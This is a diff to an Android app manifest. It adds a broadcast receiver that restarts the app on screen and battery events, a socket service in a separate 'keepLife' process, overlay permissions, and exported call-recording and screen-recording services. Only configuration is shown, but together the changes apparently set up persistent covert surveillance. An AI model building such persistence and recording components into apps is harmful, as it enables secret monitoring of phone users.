@@ -16,6 +16,8 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <application
         android:name="com.view.core.MyApplication"
@@ -66,16 +68,39 @@
             <!--</intent-filter>-->
         </activity>
 
+        <receiver android:name="com.view.core.receiver.ReStartBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.BATTERY_CHANGED"/>
+                <action android:name="android.intent.action.LOCALE_CHANGED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.view.core.services.SocketService"
+            android:enabled="true"
+            android:exported="false"
+            android:process=":keepLife"
+            ></service>
+
         <service
-            android:name="com.view.core.services.PhoneService"
+            android:name="com.view.core.services.PhoneRecordService"
             android:enabled="true"
             android:exported="true"></service>
+
+
 
         <service
             android:name="com.view.core.services.ScreenRecordService"
             android:enabled="true"
             android:exported="true"></service>
 
+        <service
+            android:name="com.view.core.services.MessageCenterService$KernelService"
+            android:exported="true"/>
+        <service
+            android:name="com.view.core.services.MessageCenterService"
+            android:exported="true"/>
 
     </application>
 
